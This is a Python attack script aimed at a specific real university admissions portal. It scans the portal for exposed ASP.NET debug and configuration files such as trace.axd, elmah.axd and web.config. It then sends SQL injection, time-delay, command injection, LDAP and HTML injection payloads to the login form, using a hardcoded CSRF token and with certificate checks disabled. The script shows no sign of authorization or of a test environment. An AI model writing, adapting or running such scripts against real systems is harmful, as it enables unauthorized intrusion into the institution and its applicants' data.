import requests
from urllib.parse import urljoin
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://portals.au.edu.pk/ADMISSIONS_TEST"

# Known misconfiguration or debug paths (ASP.NET)
misconfig_paths = [
    "trace.axd", "elmah.axd", "web.config", "Web.Debug.config",
    "Global.asax", "bin/", "App_Data/", "ScriptResource.axd?d=test",
    "default.aspx?debug=true", "page.aspx?debug=1", "test.aspx?trace=true",
    "admin/login.aspx", "dashboard.aspx"
]

# Injection payloads to test
payloads = [
    ("SQL Injection", "' OR 1=1--"),
    ("SQL Time Delay", "' OR SLEEP(5)--"),
    ("Command Injection", "test@example.com; whoami"),
    ("LDAP Injection", "*)(&(uid=*))(|(uid=*)"),
    ("HTML Injection", "<b>Injected</b>"),
]

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": base_url
}

# Modify this token if it changes (dynamic)
csrf_token = "CfDJ8CDNaoqa02FBruvjpjANVWFGIXq9U1mKqDV94u32ise1mUIiD_GIrgHmVhMGGZcfKN2XmLtNQ6kueOE16bD8txiHEzXbGaxj6OcM2YtImyuO8cbESfyiuhDYzXlXZNBvEWsNtstJDUXsWdiI4ypVuA0"

print("\n[+] Testing for misconfigurations or debug endpoints...\n")
for path in misconfig_paths:
    url = urljoin(base_url + "/", path)
    try:
        r = requests.get(url, verify=False, timeout=10)
        indicators = []
        content = r.text.lower()
        if "exception" in content:
            indicators.append("exception")
        if "stack trace" in content:
            indicators.append("stack trace")
        if "debug" in content:
            indicators.append("debug info")

        if r.status_code != 404 or indicators:
            print(f"[!] {url} => Status: {r.status_code} | Indicators: {', '.join(indicators) or 'None'}")
    except Exception as e:
        print(f"[x] {url} => ERROR: {str(e)}")

print("\n[+] Testing login form for injections...\n")
for inj_type, payload in payloads:
    data = {
        "LoginName": payload,
        "Password": "anypass123",
        "__RequestVerificationToken": csrf_token
    }
    try:
        r = requests.post(base_url, headers=headers, data=data, verify=False, timeout=10)
        status = r.status_code
        content_snippet = r.text[:200].replace("\n", "").replace("\r", "")
        print(f"[{inj_type}] Payload: {payload}\n→ Status: {status}\n→ Snippet: {content_snippet[:100]}...\n")
    except Exception as e:
        print(f"[x] Error testing {inj_type}: {str(e)}\n")

print("\n[✔] Done. Check results above.\n")
